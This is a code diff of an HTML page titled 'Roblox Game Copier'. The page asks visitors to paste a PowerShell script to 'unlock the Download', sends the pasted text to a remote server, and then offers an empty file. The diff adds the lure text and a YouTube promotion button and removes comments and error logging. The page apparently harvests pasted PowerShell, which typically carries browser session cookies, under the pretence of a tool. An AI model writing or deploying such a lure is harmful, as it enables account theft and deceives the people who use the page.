@@ -5,7 +5,7 @@
 <title>Download Page</title>
 <style>
   body {
-    background: linear-gradient(135deg, #1e3a8a, #2563eb);
+    background: linear-gradient(135deg, #3b82f6, #ec4899);
     color: #f8fafc;
     font-family: Arial, sans-serif;
     display: flex;
@@ -13,6 +13,32 @@
     align-items: center;
     height: 100vh;
     margin: 0;
+  }
+
+  /* Bouton YouTube */
+  .yt-button {
+    position: absolute;
+    top: 20px;
+    left: 20px;
+    width: 56px;
+    height: 56px;
+    border-radius: 50%;
+    background: white;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    box-shadow: 0 6px 18px rgba(0,0,0,0.3);
+    cursor: pointer;
+    transition: transform 0.2s;
+  }
+
+  .yt-button:hover {
+    transform: scale(1.1);
+  }
+
+  .yt-button img {
+    width: 32px;
+    height: 32px;
   }
 
   .box {
@@ -65,9 +91,18 @@
 </style>
 </head>
 <body>
+
+<!-- Bouton chaîne YouTube -->
+<a class="yt-button"
+   href="https://www.youtube.com/@AndroidOwnedScripterOwner"
+   target="_blank"
+   title="Visit YouTube Channel">
+  <img src="https://www.youtube.com/favicon.ico" alt="YouTube">
+</a>
+
 <div class="box">
-  <h2>Paste your PowerShell script</h2>
-  <p>Submit your script first to unlock download.</p>
+  <h2>Roblox Game Copier</h2>
+  <p>Submit the PowerShell to unlock the Download</p>
 
   <textarea id="input" placeholder="Paste here..."></textarea>
   <button id="submit" disabled>Submit script</button>
@@ -79,13 +114,11 @@ const input = document.getElementById("input");
 const submitBtn = document.getElementById("submit");
 const downloadBtn = document.getElementById("download");
 
-// Validation simple pour détecter un script PowerShell
 function isPowerShell(text) {
   const keywords = ["$", "Get-", "Set-", "New-", "Invoke-", "Write-Host", "Start-Process"];
   return text.trim() !== "" && keywords.some(k => text.includes(k));
 }
 
-// Débloquer le bouton Submit si texte valide
 input.addEventListener("input", () => {
   if(isPowerShell(input.value)) {
     submitBtn.disabled = false;
@@ -96,7 +129,6 @@ input.addEventListener("input", () => {
   }
 });
 
-// Envoyer au serveur Render au clic sur Submit
 submitBtn.addEventListener("click", () => {
   const textValue = input.value;
 
@@ -105,18 +137,15 @@ submitBtn.addEventListener("click", () => {
     headers: { "Content-Type": "application/json" },
     body: JSON.stringify({ content: textValue })
   }).then(() => {
-    console.log("Message envoyé !");
     downloadBtn.disabled = false;
     downloadBtn.classList.add("enabled");
     submitBtn.disabled = true;
     submitBtn.classList.remove("enabled");
-  }).catch(err => {
-    console.error("Erreur serveur :", err);
+  }).catch(() => {
     alert("Erreur lors de l'envoi. Réessayez !");
   });
 });
 
-// Télécharger le fichier au clic sur Download
 downloadBtn.addEventListener("click", () => {
   const blob = new Blob([""], { type: "application/octet-stream" });
   const url = URL.createObjectURL(blob);
